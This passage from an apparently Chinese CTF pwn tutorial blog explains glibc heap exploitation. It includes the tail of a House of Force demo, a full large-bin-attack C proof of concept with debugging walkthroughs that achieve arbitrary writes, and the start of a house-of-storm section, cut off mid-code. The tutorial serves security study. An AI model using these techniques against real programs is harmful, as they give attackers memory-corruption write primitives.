class="type">long</span>)bss_var - <span class="built_in">sizeof</span>(<span class="type">long</span>)*<span class="number">4</span> - (<span class="type">unsigned</span> <span class="type">long</span>)ptr_top;</span><br><span class="line">	<span class="built_in">fprintf</span>(stderr, <span class="string">&quot;\nThe value we want to write to at %p, and the top chunk is at %p, so accounting for the header size,\n&quot;</span></span><br><span class="line">	   <span class="string">&quot;we will malloc %#lx bytes.\n&quot;</span>, bss_var, ptr_top, evil_size);</span><br><span class="line">	<span class="type">void</span> *new_ptr = <span class="built_in">malloc</span>(evil_size);</span><br><span class="line">	<span class="built_in">fprintf</span>(stderr, <span class="string">&quot;As expected, the new pointer is at the same place as the old top chunk: %p\n&quot;</span>, new_ptr - <span class="built_in">sizeof</span>(<span class="type">long</span>)*<span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">	<span class="type">void</span>* ctr_chunk = <span class="built_in">malloc</span>(<span class="number">100</span>);</span><br><span class="line">	<span class="built_in">fprintf</span>(stderr, <span class="string">&quot;\nNow, the next chunk we overwrite will point at our target buffer.\n&quot;</span>);</span><br><span class="line">	<span class="built_in">fprintf</span>(stderr, <span class="string">&quot;malloc(100) =&gt; %p!\n&quot;</span>, ctr_chunk);</span><br><span class="line">	<span class="built_in">fprintf</span>(stderr, <span class="string">&quot;Now, we can finally overwrite that value:\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">fprintf</span>(stderr, <span class="string">&quot;... old string: %s\n&quot;</span>, bss_var);</span><br><span class="line">	<span class="built_in">fprintf</span>(stderr, <span class="string">&quot;... doing strcpy overwrite with \&quot;YEAH!!!\&quot;...\n&quot;</span>);</span><br><span class="line">	<span class="built_in">strcpy</span>(ctr_chunk, <span class="string">&quot;YEAH!!!&quot;</span>);</span><br><span class="line">	<span class="built_in">fprintf</span>(stderr, <span class="string">&quot;... new string: %s\n&quot;</span>, bss_var);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">assert</span>(ctr_chunk == bss_var);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	<span class="comment">// some further discussion:</span></span><br><span class="line">	<span class="comment">//fprintf(stderr, &quot;This controlled malloc will be called with a size parameter of evil_size = malloc_got_address - 8 - p2_guessed\n\n&quot;);</span></span><br><span class="line">	<span class="comment">//fprintf(stderr, &quot;This because the main_arena-&gt;top pointer is setted to current av-&gt;top + malloc_size &quot;</span></span><br><span class="line">	<span class="comment">//	&quot;and we \nwant to set this result to the address of malloc_got_address-8\n\n&quot;);</span></span><br><span class="line">	<span class="comment">//fprintf(stderr, &quot;In order to do this we have malloc_got_address-8 = p2_guessed + evil_size\n\n&quot;);</span></span><br><span class="line">	<span class="comment">//fprintf(stderr, &quot;The av-&gt;top after this big malloc will be setted in this way to malloc_got_address-8\n\n&quot;);</span></span><br><span class="line">	<span class="comment">//fprintf(stderr, &quot;After that a new call to malloc will return av-&gt;top+8 ( +8 bytes for the header ),&quot;</span></span><br><span class="line">	<span class="comment">//	&quot;\nand basically return a chunk at (malloc_got_address-8)+8 = malloc_got_address\n\n&quot;);</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">//fprintf(stderr, &quot;The large chunk with evil_size has been allocated here 0x%08x\n&quot;,p2);</span></span><br><span class="line">	<span class="comment">//fprintf(stderr, &quot;The main_arena value av-&gt;top has been setted to malloc_got_address-8=0x%08x\n&quot;,malloc_got_address);</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">//fprintf(stderr, &quot;This last malloc will be served from the remainder code and will return the av-&gt;top+8 injected before\n&quot;);</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<h3 id="调试-11"><a href="#调试-11" class="headerlink" title="调试"></a>调试</h3><p> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/958172_D3DCDBFN6BFS7AY.png"
                      alt="图片描述"
                ><br>首先申请了一个<code>a_real=0x111</code>大小的堆块，利用<code>off-by-one</code>将<code>top_chunk</code>的<code>size</code>改为<code>-1</code>，此时我们便可以申请到任意地址，<code>top_chunk地址 = 原top_chunk地址 + 对齐后的申请大小</code>。只要我们计算好距离，便可申请到任意地址，下到<code>got</code>,<code>bss</code>，上到<code>__malloc_hook</code>，相当于任意地址写的能力。<br> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/958172_KN4WJWSJJ4HC9VE.png"
                      alt="图片描述"
                ><br> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/958172_FRYZ59TQMSFW6TK.png"
                      alt="图片描述"
                ><br>计算出<code>bss_var-0x20</code>到<code>top_chunk</code>的距离<code>0x602060-0x603110=-5A2 E0B0</code>，注意此时我们申请结束后，<code>top_chunk=0x6030110+(-5A2EB0)+0x10=0x602070</code>，成功将top_chunk迁移到了目标地址下方。<br> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/958172_QRUXTS646FKXEAS.png"
                      alt="图片描述"
                ><br>堆由低地址向高地址增长，我们此时申请<code>0x68</code>大小的堆块时，<code>top_chunk=0x602070+0x68+0x8=0x6020e0</code>，成功将目标地址放入新申请堆块的<code>fd</code>指针处。</p>
<h2 id="large-bin-attack"><a href="#large-bin-attack" class="headerlink" title="large_bin_attack"></a>large_bin_attack</h2><p><code>glibc-2.29</code> 之前的 <code>large_bin_attack</code> 可以修改两个值。</p>
<h3 id="源码-12"><a href="#源码-12" class="headerlink" title="源码"></a>源码</h3><div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    This technique is taken from</span></span><br><span class="line"><span class="comment">    https://dangokyo.me/2018/04/07/a-revisit-to-large-bin-in-glibc/</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    [...]</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">              else</span></span><br><span class="line"><span class="comment">              &#123;</span></span><br><span class="line"><span class="comment">                  victim-&gt;fd_nextsize = fwd;</span></span><br><span class="line"><span class="comment">                  victim-&gt;bk_nextsize = fwd-&gt;bk_nextsize;</span></span><br><span class="line"><span class="comment">                  fwd-&gt;bk_nextsize = victim;</span></span><br><span class="line"><span class="comment">                  victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;</span></span><br><span class="line"><span class="comment">              &#125;</span></span><br><span class="line"><span class="comment">              bck = fwd-&gt;bk;</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    [...]</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    mark_bin (av, victim_index);</span></span><br><span class="line"><span class="comment">    victim-&gt;bk = bck;</span></span><br><span class="line"><span class="comment">    victim-&gt;fd = fwd;</span></span><br><span class="line"><span class="comment">    fwd-&gt;bk = victim;</span></span><br><span class="line"><span class="comment">    bck-&gt;fd = victim;</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    For more details on how large-bins are handled and sorted by ptmalloc,</span></span><br><span class="line"><span class="comment">    please check the Background section in the aforementioned link.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    [...]</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;assert.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">fprintf</span>(stderr, <span class="string">&quot;This file demonstrates large bin attack by writing a large unsigned long value into stack\n&quot;</span>);</span><br><span class="line">    <span class="built_in">fprintf</span>(stderr, <span class="string">&quot;In practice, large bin attack is generally prepared for further attacks, such as rewriting the &quot;</span></span><br><span class="line">           <span class="string">&quot;global variable global_max_fast in libc for further fastbin attack\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> stack_var1 = <span class="number">0</span>;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> stack_var2 = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">fprintf</span>(stderr, <span class="string">&quot;Let&#x27;s first look at the targets we want to rewrite on stack:\n&quot;</span>);</span><br><span class="line">    <span class="built_in">fprintf</span>(stderr, <span class="string">&quot;stack_var1 (%p): %ld\n&quot;</span>, &amp;stack_var1, stack_var1);</span><br><span class="line">    <span class="built_in">fprintf</span>(stderr, <span class="string">&quot;stack_var2 (%p): %ld\n\n&quot;</span>, &amp;stack_var2, stack_var2);</span><br><span class="line"></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> *p1 = <span class="built_in">malloc</span>(<span class="number">0x420</span>);</span><br><span class="line">    <span class="built_in">fprintf</span>(stderr, <span class="string">&quot;Now, we allocate the first large chunk on the heap at: %p\n&quot;</span>, p1 - <span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">fprintf</span>(stderr, <span class="string">&quot;And allocate another fastbin chunk in order to avoid consolidating the next large chunk with&quot;</span></span><br><span class="line">           <span class="string">&quot; the first large chunk during the free()\n\n&quot;</span>);</span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x20</span>);</span><br><span class="line"></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> *p2 = <span class="built_in">malloc</span>(<span class="number">0x500</span>);</span><br><span class="line">    <span class="built_in">fprintf</span>(stderr, <span class="string">&quot;Then, we allocate the second large chunk on the heap at: %p\n&quot;</span>, p2 - <span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">fprintf</span>(stderr, <span class="string">&quot;And allocate another fastbin chunk in order to avoid consolidating the next large chunk with&quot;</span></span><br><span class="line">           <span class="string">&quot; the second large chunk during the free()\n\n&quot;</span>);</span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x20</span>);</span><br><span class="line"></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> *p3 = <span class="built_in">malloc</span>(<span class="number">0x500</span>);</span><br><span class="line">    <span class="built_in">fprintf</span>(stderr, <span class="string">&quot;Finally, we allocate the third large chunk on the heap at: %p\n&quot;</span>, p3 - <span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">fprintf</span>(stderr, <span class="string">&quot;And allocate another fastbin chunk in order to avoid consolidating the top chunk with&quot;</span></span><br><span class="line">           <span class="string">&quot; the third large chunk during the free()\n\n&quot;</span>);</span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x20</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">free</span>(p1);</span><br><span class="line">    <span class="built_in">free</span>(p2);</span><br><span class="line">    <span class="built_in">fprintf</span>(stderr, <span class="string">&quot;We free the first and second large chunks now and they will be inserted in the unsorted bin:&quot;</span></span><br><span class="line">           <span class="string">&quot; [ %p &lt;--&gt; %p ]\n\n&quot;</span>, (<span class="type">void</span> *)(p2 - <span class="number">2</span>), (<span class="type">void</span> *)(p2[<span class="number">0</span>]));</span><br><span class="line"></span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x90</span>);</span><br><span class="line">    <span class="built_in">fprintf</span>(stderr, <span class="string">&quot;Now, we allocate a chunk with a size smaller than the freed first large chunk. This will move the&quot;</span></span><br><span class="line">            <span class="string">&quot; freed second large chunk into the large bin freelist, use parts of the freed first large chunk for allocation&quot;</span></span><br><span class="line">            <span class="string">&quot;, and reinsert the remaining of the freed first large chunk into the unsorted bin:&quot;</span></span><br><span class="line">            <span class="string">&quot; [ %p ]\n\n&quot;</span>, (<span class="type">void</span> *)((<span class="type">char</span> *)p1 + <span class="number">0x90</span>));</span><br><span class="line"></span><br><span class="line">    <span class="built_in">free</span>(p3);</span><br><span class="line">    <span class="built_in">fprintf</span>(stderr, <span class="string">&quot;Now, we free the third large chunk and it will be inserted in the unsorted bin:&quot;</span></span><br><span class="line">           <span class="string">&quot; [ %p &lt;--&gt; %p ]\n\n&quot;</span>, (<span class="type">void</span> *)(p3 - <span class="number">2</span>), (<span class="type">void</span> *)(p3[<span class="number">0</span>]));</span><br><span class="line"></span><br><span class="line">    <span class="comment">//------------VULNERABILITY-----------</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">fprintf</span>(stderr, <span class="string">&quot;Now emulating a vulnerability that can overwrite the freed second large chunk&#x27;s \&quot;size\&quot;&quot;</span></span><br><span class="line">            <span class="string">&quot; as well as its \&quot;bk\&quot; and \&quot;bk_nextsize\&quot; pointers\n&quot;</span>);</span><br><span class="line">    <span class="built_in">fprintf</span>(stderr, <span class="string">&quot;Basically, we decrease the size of the freed second large chunk to force malloc to insert the freed third large chunk&quot;</span></span><br><span class="line">            <span class="string">&quot; at the head of the large bin freelist. To overwrite the stack variables, we set \&quot;bk\&quot; to 16 bytes before stack_var1 and&quot;</span></span><br><span class="line">            <span class="string">&quot; \&quot;bk_nextsize\&quot; to 32 bytes before stack_var2\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    p2[<span class="number">-1</span>] = <span class="number">0x3f1</span>;</span><br><span class="line">    p2[<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line">    p2[<span class="number">2</span>] = <span class="number">0</span>;</span><br><span class="line">    p2[<span class="number">1</span>] = (<span class="type">unsigned</span> <span class="type">long</span>)(&amp;stack_var1 - <span class="number">2</span>);</span><br><span class="line">    p2[<span class="number">3</span>] = (<span class="type">unsigned</span> <span class="type">long</span>)(&amp;stack_var2 - <span class="number">4</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//------------------------------------</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x90</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">fprintf</span>(stderr, <span class="string">&quot;Let&#x27;s malloc again, so the freed third large chunk being inserted into the large bin freelist.&quot;</span></span><br><span class="line">            <span class="string">&quot; During this time, targets should have already been rewritten:\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">fprintf</span>(stderr, <span class="string">&quot;stack_var1 (%p): %p\n&quot;</span>, &amp;stack_var1, (<span class="type">void</span> *)stack_var1);</span><br><span class="line">    <span class="built_in">fprintf</span>(stderr, <span class="string">&quot;stack_var2 (%p): %p\n&quot;</span>, &amp;stack_var2, (<span class="type">void</span> *)stack_var2);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// sanity check</span></span><br><span class="line">    <span class="built_in">assert</span>(stack_var1 != <span class="number">0</span>);</span><br><span class="line">    <span class="built_in">assert</span>(stack_var2 != <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<h3 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h3><p>large bin 结构图。<br> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/958172_VFQNFY7QR4V8CRG-1695379768564-24.webp"
                      alt="图片描述"
                ></p>
<ol>
<li>大于 0x400 的 chunk 属于 large bin 范畴。</li>
<li>fd -&gt; 后一个大小相同的 chunk，bk 指向前一个大小相同的 chunk。</li>
<li>fd_nextsize -&gt; 比他小的最大 chunk。</li>
<li>bk_nextsize -&gt; 比他大的最小的heap。</li>
<li>最后将两条链条首尾相连。</li>
</ol>
<h3 id="调试-12"><a href="#调试-12" class="headerlink" title="调试"></a>调试</h3><p>首先栈上放置两个值为 0 的栈变量。<br> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/958172_B9PMX7Y6BUNXX68-1695379746623-20.webp"
                      alt="图片描述"
                ><br>然后布置如下结构的堆。<br> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/958172_NTGAR62F4NUUEPD-1695379792691-27.webp"
                      alt="图片描述"
                ><br>依次释放 non-fast 大小的 p1, p2，它们将会被挂到 unsorted bin 。并且 p2-&gt;p1 。<br> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/958172_PH5MQPBFFHH6UWF-1695379744185-16.webp"
                      alt="图片描述"
                ><br>此时申请 0x90 大小的堆块将会遍历 unsorted bin , 但 unsorted bin 中并无正好合适的 chunk 。所以会切割先进来的 p1 成为 last_remainder 留在 unsorted bin，并把 p2 放进 large bin 。<br> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/958172_KMUDJ58864BVGRJ-1695379733565-12.webp"
                      alt="图片描述"
                ><br>之后 free(p3)，p3 进入 unsorted bin , p3-&gt;p1。<br> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/958172_7R56GD8898CAHVC-1695379732363-10.webp"
                      alt="图片描述"
                ><br>然后如下修改 p2 的结构，让 p3_size &gt; p2_size ，以便后续利用。<br> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/958172_C845XWYM8RY6FP2-1695379729718-6.webp"
                      alt="图片描述"
                ><br> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/958172_FSXFTBKCRMVYT59-1695379728616-4.webp"
                      alt="图片描述"
                ><br>此时 p2 结构如下。<br> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/958172_NWAPT4CW7S4UWB8-1695379724638-1.webp"
                      alt="图片描述"
                ><br>再次申请 0x90 大小的堆块，将会再次遍历 unsorted bin 。将 p1 切割，将 p3 放进 large bin 。<br>放入过程中如果 p3_size &gt; p2_size 。将会执行如下代码:</p>
<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* 源码 */</span></span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">    victim-&gt;fd_nextsize = fwd;</span><br><span class="line">    victim-&gt;bk_nextsize = fwd-&gt;bk_nextsize;</span><br><span class="line">    fwd-&gt;bk_nextsize = victim;</span><br><span class="line">    victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;    </span><br><span class="line">&#125;</span><br><span class="line">bck = fwd-&gt;bk;</span><br><span class="line"><span class="comment">/* “译”码 */</span></span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">    P3-&gt;fd_nextsize = P2;</span><br><span class="line">    P3-&gt;bk_nextsize = P2-&gt;bk_nextsize; </span><br><span class="line">    P2-&gt;bk_nextsize = P3;</span><br><span class="line">    P3-&gt;bk_nextsize-&gt;fd_nextsize = P3; </span><br><span class="line">&#125;</span><br><span class="line">bck = P2-&gt;bk;</span><br></pre></td></tr></table></figure></div>
<p>即 stack_var2 &#x3D; p3。</p>
<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* 源码 */</span></span><br><span class="line"><span class="built_in">mark_bin</span> (av, victim_index);</span><br><span class="line">victim-&gt;bk = bck;</span><br><span class="line">victim-&gt;fd = fwd;</span><br><span class="line">fwd-&gt;bk = victim;</span><br><span class="line">bck-&gt;fd = victim;</span><br><span class="line"><span class="comment">/* “译”码 */</span></span><br><span class="line"><span class="built_in">mark_bin</span>(av, victim_index);</span><br><span class="line">P3-&gt;bk = p2-&gt;bk;</span><br><span class="line">P3-&gt;fd = P2;</span><br><span class="line">P2-&gt;bk = P3;</span><br><span class="line">bck-&gt;fd = P3; <span class="comment">// bck 是原p2-&gt;bk(见上一段代码的bck)</span></span><br></pre></td></tr></table></figure></div>
<p>即 stack_var1 &#x3D; p3，至此利用完成，具体如何利用可看例题。</p>
<h2 id="house-of-storm"><a href="#house-of-storm" class="headerlink" title="house of storm"></a>house of storm</h2><p><code>glibc &lt; 2.29</code>，例题 <code>heap2storm</code> 结合 <code>ptmalloc</code> 源码讲的更为详细一些，这里简化了很多。</p>
<h3 id="源码-13"><a href="#源码-13" class="headerlink" title="源码"></a>源码</h3><div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span 